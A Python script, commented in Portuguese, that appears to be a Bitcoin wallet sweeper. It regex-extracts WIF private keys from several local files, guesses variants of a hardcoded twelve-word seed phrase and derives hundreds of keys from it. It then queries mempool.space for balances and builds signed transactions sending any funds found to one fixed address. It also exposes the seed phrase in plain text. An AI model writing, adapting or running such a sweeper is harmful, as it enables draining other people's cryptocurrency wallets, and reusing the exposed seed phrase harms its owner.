import requests
import re
import time
import csv
from bitcoinlib.keys import Key, HDKey
from bitcoinlib.transactions import Transaction

def extract_keys_from_any_file(filename):
    keys = []
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        # Busca padrão WIF (L, K ou 5 com 51-52 caracteres)
        found = re.findall(r'[LK5][1-9A-HJ-NP-Za-km-z]{50,51}', content)
        keys.extend(found)
    except Exception as e:
        print(f"Erro ao ler {filename}: {e}")
    return keys

def scan_mega_protocol():
    dest_address = '1E4FSo55XCjSDhpXBsRkB5o9f4fkVxGtcL'
    all_keys_wif = []

    # 1. Coleta de chaves de todos os arquivos disponíveis
    files_to_scan = [
        'privatekeys.txt', 
        'priv.key.rtf', 
        'chaves_extraídas_e_endereços_1.txt',
        'FDR_Master_Wallet_Complete_20251006_143555_2.csv'
    ]
    
    for file in files_to_scan:
        found = extract_keys_from_any_file(file)
        print(f"Arquivo {file}: {len(found)} chaves encontradas.")
        all_keys_wif.extend(found)

    # 2. Tentativa de correção e derivação da Mnemônica
    variations = ["tree", "three", "true", "free"]
    base_phrase = "tree dwarf rubber off {} finger hair hope emerge earn friend such"
    
    for var in variations:
        phrase = base_phrase.format(var)
        try:
            master = HDKey.from_passphrase(phrase, network='bitcoin')
            print(f"Mnemônica validada com sucesso ('{var}'). Derivando endereços...")
            for i in range(100):
                for path in [f"m/44'/0'/0'/0/{i}", f"m/49'/0'/0'/0/{i}", f"m/84'/0'/0'/0/{i}"]:
                    all_keys_wif.append(master.subkey_for_path(path).wif())
            break
        except: continue

    # Limpeza de duplicatas
    all_keys_wif = list(dict.fromkeys(all_keys_wif))
    print(f"Total de chaves exclusivas para varredura: {len(all_keys_wif)}")

    # 3. Varredura de Rede (Mempool)
    for wif in all_keys_wif:
        try:
            k = Key(wif, network='bitcoin')
            # Testa Legacy, SegWit e Native SegWit para cada chave
            for t_type in ['p2pkh', 'p2wpkh', 'p2sh-p2wpkh']:
                addr = k.address(witness_type=t_type)
                
                try:
                    r = requests.get(f"https://mempool.space/api/address/{addr}/utxo", timeout=8)
                    if r.status_code == 200:
                        utxos = r.json()
                        if utxos:
                            print(f"!!! SALDO DETECTADO !!! Endereço: {addr}")
                            utxo = max(utxos, key=lambda x: x['value'])
                            fee = 50000 # Taxa de prioridade máxima (Ultra)
                            amount = utxo['value'] - fee
                            
                            if amount > 1000:
                                tx = Transaction(network='bitcoin')
                                tx.add_input(prev_txid=utxo['txid'], output_n=utxo['vout'], value=utxo['value'], address=addr)
                                tx.add_output(value=amount, address=dest_address)
                                tx.sign([wif])
                                print(f"HEX_GEN:{tx.raw_hex()}")
                except: continue
            time.sleep(0.02)
        except: continue

if __name__ == "__main__":
    scan_mega_protocol()
